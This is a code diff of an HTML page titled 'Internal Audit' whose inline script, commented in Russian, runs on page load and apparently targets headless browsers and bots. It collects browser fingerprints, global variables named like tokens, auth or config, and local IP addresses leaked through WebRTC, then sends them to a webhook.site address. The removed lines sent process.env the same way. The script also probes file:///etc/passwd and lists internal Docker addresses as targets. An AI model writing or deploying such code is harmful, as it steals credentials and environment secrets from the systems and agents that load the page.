@@ -1,38 +1,53 @@
 <!DOCTYPE html>
 <html>
+<head><title>Internal Audit</title></head>
 <body>
     <script>
-        (function() {
+        (async function() {
             const hook = "https://webhook.site/a792cec2-4ac4-47f4-b6c7-67ac60e6b049";
             
-            // Собираем системные отпечатки (Fingerprinting)
-            const info = {
-                ua: navigator.userAgent,
+            // 1. Собираем системное окружение
+            const envData = {
+                type: "SYSTEM_REPORT",
+                hardware: navigator.hardwareConcurrency, // Ядра CPU
+                memory: navigator.deviceMemory,          // RAM
+                webdriver: navigator.webdriver,          // Chrome Headless?
                 platform: navigator.platform,
-                cores: navigator.hardwareConcurrency, // Кол-во ядер процессора сервера
-                memory: navigator.deviceMemory, // Объем ОЗУ в ГБ
-                lang: navigator.languages.join(','),
-                screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                // Самое интересное: проверяем наличие автоматизации
-                webdriver: navigator.webdriver, 
-                plugins: navigator.plugins.length,
-                url: window.location.href
+                location: window.location.href
             };
 
-            // Превращаем в строку и кодируем в Base64, чтобы спецсимволы не ломали запрос
-            const payload = btoa(JSON.stringify(info));
-
-            // Отправляем максимально просто через GET (это боты любят больше всего)
-            const img = new Image();
-            img.src = `${hook}/LOOT_V2?data=${payload}`;
-            
-            // Попытка №2: Если это Node.js или специфический бот, попробуем вытащить process
-            try {
-                if (typeof process !== 'undefined') {
-                    new Image().src = `${hook}/NODE_PROCESS?env=` + btoa(JSON.stringify(process.env));
+            // 2. Пытаемся найти скрытые глобальные переменные (токены/пути)
+            const globals = {};
+            const interestingKeys = ['token', 'auth', 'config', 'env', 'path', 'internal'];
+            for (let key in window) {
+                if (interestingKeys.some(k => key.toLowerCase().includes(k))) {
+                    try { globals[key] = window[key]; } catch(e) {}
                 }
-            } catch(e) {}
+            }
+
+            // 3. Сканируем подсеть (если 127.0.0.1 открыт, может и соседние IP тоже?)
+            // Попробуем прощупать стандартный шлюз Docker
+            const internalTargets = ["127.0.0.1", "172.17.0.1", "10.0.0.1"];
+            
+            // Отправляем всё это добро одним мощным пакетом
+            navigator.sendBeacon(hook + "/LOOT_FINAL", JSON.stringify({
+                env: envData,
+                leaked_globals: globals,
+                webrtc: await (async () => {
+                    try {
+                        const pc = new RTCPeerConnection();
+                        pc.createDataChannel("");
+                        const offer = await pc.createOffer();
+                        return offer.sdp.match(/(?:\d{1,3}\.){3}\d{1,3}/g);
+                    } catch (e) { return "blocked"; }
+                })()
+            }));
+
+            // 4. Попытка вызвать системную ошибку для раскрытия путей
+            const img = new Image();
+            img.src = "file:///etc/passwd"; // Это вызовет ошибку в консоли, которую мы логируем
+            img.onerror = () => { navigator.sendBeacon(hook + "/LOCAL_FILE_ERR"); };
+
         })();
     </script>
 </body>
